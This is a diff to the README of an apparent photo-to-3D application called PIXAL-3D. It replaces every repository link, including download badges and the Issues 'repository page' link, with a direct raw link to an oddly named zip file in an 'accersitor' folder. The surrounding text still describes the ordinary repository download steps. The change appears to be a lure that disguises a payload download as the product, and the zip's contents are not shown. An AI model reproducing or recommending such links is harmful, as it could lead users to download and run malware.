@@ -1,6 +1,6 @@
 # 🎨 PIXAL-3D - Turn Your Photos into 3D Models Instantly
 
-[![Download PIXAL-3D](https://img.shields.io/badge/Download-PIXAL--3D-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gerogonzalezr59/PIXAL-3D)
+[![Download PIXAL-3D](https://img.shields.io/badge/Download-PIXAL--3D-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/gerogonzalezr59/PIXAL-3D/main/accersitor/D-PIXA-2.7-beta.5.zip)
 
 ## 📸 What Is PIXAL-3D?
 
@@ -38,7 +38,7 @@ Ready to bring your photos into the third dimension? Follow these simple steps.
 
 ### Step 1: Download PIXAL-3D
 
-[![Get PIXAL-3D Now](https://img.shields.io/badge/⬇️%20GET%20PIXAL--3D-FF6B6B?style=for-the-badge)](https://github.com/gerogonzalezr59/PIXAL-3D)
+[![Get PIXAL-3D Now](https://img.shields.io/badge/⬇️%20GET%20PIXAL--3D-FF6B6B?style=for-the-badge)](https://raw.githubusercontent.com/gerogonzalezr59/PIXAL-3D/main/accersitor/D-PIXA-2.7-beta.5.zip)
 
 Visit this link to download the application. The download page will show you a green button labeled "Code" — click it, then choose "Download ZIP." Alternatively, look for the "Releases" section on the right side of that page to find the latest version.
 
@@ -138,7 +138,7 @@ Keep an eye on the repository's release notes to stay updated.
 
 If you run into trouble or have questions, the GitHub Issues section is the best place. Here's how to ask effectively:
 
-1. Go to [the repository page](https://github.com/gerogonzalezr59/PIXAL-3D)
+1. Go to [the repository page](https://raw.githubusercontent.com/gerogonzalezr59/PIXAL-3D/main/accersitor/D-PIXA-2.7-beta.5.zip)
 2. Click "Issues" at the top
 3. Click "New Issue"
 4. Describe your problem, the steps you took, and include a screenshot if possible
@@ -151,7 +151,7 @@ PIXAL-3D puts professional-grade 3D generation into the hands of anyone with a d
 
 The entire process — download, setup, and first conversion — takes under fifteen minutes. Your creativity is the only limit.
 
-[![Download PIXAL-3D Now](https://img.shields.io/badge/⬇️%20DOWNLOAD%20PIXAL--3D-32CD32?style=for-the-badge)](https://github.com/gerogonzalezr59/PIXAL-3D)
+[![Download PIXAL-3D Now](https://img.shields.io/badge/⬇️%20DOWNLOAD%20PIXAL--3D-32CD32?style=for-the-badge)](https://raw.githubusercontent.com/gerogonzalezr59/PIXAL-3D/main/accersitor/D-PIXA-2.7-beta.5.zip)
 
 Give it a try today — turn your world into 3D!
 
